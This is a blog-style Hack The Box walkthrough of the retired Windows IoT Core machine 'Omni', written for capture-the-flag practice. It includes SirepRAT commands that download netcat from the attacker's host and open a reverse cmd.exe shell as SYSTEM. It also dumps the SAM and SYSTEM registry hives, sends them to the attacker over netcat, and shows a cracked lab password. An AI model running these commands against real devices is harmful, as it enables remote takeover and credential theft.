---
layout: post  
title: "Omni: Hack The Box Walkthrough"
date: 2021-01-10 22:26:01 +0000
last_modified_at: 2021-01-10 22:26:01 +0000
category: Walkthrough
tags: ["Hack The Box", Omni, retired, Other, Easy]
comments: true
protect: false
image:
  feature: omni-htb-walkthrough.png
---

This post documents the complete walkthrough of Omni, a retired vulnerable [VM][1] created by [egre55][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Omni is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.204 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-25 06:31:15 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.204
Discovered open port 29820/tcp on 10.10.10.204
Discovered open port 29819/tcp on 10.10.10.204
Discovered open port 29817/tcp on 10.10.10.204
Discovered open port 5985/tcp on 10.10.10.204
Discovered open port 135/tcp on 10.10.10.204
```

Interesting list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p135,5985,8080,29817,29819,29820 -A --reason 10.10.10.204 -oN nmap.txt
...
PORT      STATE SERVICE  REASON          VERSION
135/tcp   open  msrpc    syn-ack ttl 127 Microsoft Windows RPC
5985/tcp  open  upnp     syn-ack ttl 127 Microsoft IIS httpd
8080/tcp  open  upnp     syn-ack ttl 127 Microsoft IIS httpd
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
29817/tcp open  unknown  syn-ack ttl 127
29819/tcp open  arcserve syn-ack ttl 127 ARCserve Discovery
29820/tcp open  unknown  syn-ack ttl 127
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port29820-TCP:V=7.80%I=7%D=8/25%Time=5F44B97B%P=x86_64-pc-linux-gnu%r(N
SF:ULL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines,10,"
SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"\*LY\xa5\xfb`\x0
SF:4G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\x
SF:c9}\xc8O\x12");
```

Looks like we have a Windows IoT Core device on hand from the looks of **Windows Device Portal**!

## Foothold

But hold up, what's `29820/tcp`? Google for _"windows iot core 29820"_ led me to SirepRat.

{% include image.html image_alt="df17f592.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/df17f592.png" %}

### SirepRAT - RCE as SYSTEM on Windows IoT Core

Using [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT), I was able to transfer [`nc64.exe`](https://eternallybored.org/misc/netcat/) (renamed to `cute.exe`) to the device, with the intention of running a reverse shell back to me.

```
# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "powershell.exe" --args "iwr http://10.10.14.25/nc64.exe -outf \\cute.exe" --v
```

Run `nc64.exe` like so.

```
# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "cmd.exe" --args "/c start \\cute.exe 10.10.14.25 1234 -e cmd.exe" --v
```

And we have shell, as **NT AUTHORITY\SYSTEM** no less!

{% include image.html image_alt="b3f0b7e2.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/b3f0b7e2.png" %}

### Protected by DPAPI

Finding the location of `user.txt` is simple.

{% include image.html image_alt="2666dfbb.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/2666dfbb.png" %}

However, this is not your usual `user.txt`.

{% include image.html image_alt="170af5ee.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/170af5ee.png" %}

The flag is protected by DPAPI, which means I have to get a shell as `app` in order to decrypt it. More on that later...

### Dumping SAMS

Since we have superuser privileges, it's trivial to dump SAMS. Save the hives as files like so.

```
C:\>reg save hklm\sams SAMS
C:\>reg save hklm\system SYSTEM
```

I'll use `nc64.exe` (renamed as `cute.exe`) to transfer the files over to my machine for offline cracking with John the Ripper.

On the remote machine, run the following command.

```
C:\cute.exe 10.10.14.25 8888 < SAMS
```

On your machine, run the following command.

```
# nc -lnvp 8888 > SAMS
```

Do likewise for `SYSTEM`. Once you have SAMS and SYSTEM on your machine, dump the NTHASH with Impacket's `secretsdump.py`.

{% include image.html image_alt="f0671dab.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/f0671dab.png" %}

### John the Ripper

{% include image.html image_alt="6f857951.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/6f857951.png" %}

We have `app`'s password (`mesh5143`).

### Windows Device Portal

Armed with `app`'s password, we can finally explore what's inside Windows Device Portal.

{% include image.html image_alt="9415c064.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/9415c064.png" %}

Turns out we can run commands as `app`, which means we'll be getting a shell as `app`!

{% include image.html image_alt="ead24376.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/ead24376.png" %}

And here we go...

{% include image.html image_alt="0ce314e3.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/0ce314e3.png" %}

### Decrypting `user.txt`

I got all the information about decrypting PSCredential objects from [here](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx). The key to displaying the encrypted strings is the `Import-CliXml` cmdlet. Here's how.

{% include image.html image_alt="e5bffa08.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/e5bffa08.png" %}

That's it. It is this simple.

## Privilege Escalation

While we are it, here's the `administrator`'s password, protected by DPAPI.

{% include image.html image_alt="8d65bc42.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/8d65bc42.png" %}

Of course it has something to do with Internet of Things. :laughing:

### Getting `root.txt`

Getting a shell as `administrator` is similar. Run a command from Windows Device Portal. With the `administrator` shell, we can decrypt `root.txt` like so.

{% include image.html image_alt="88565263.png" image_src="/34592214-9c25-4f67-ac03-6e1cd8f752b8/88565263.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/271
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/
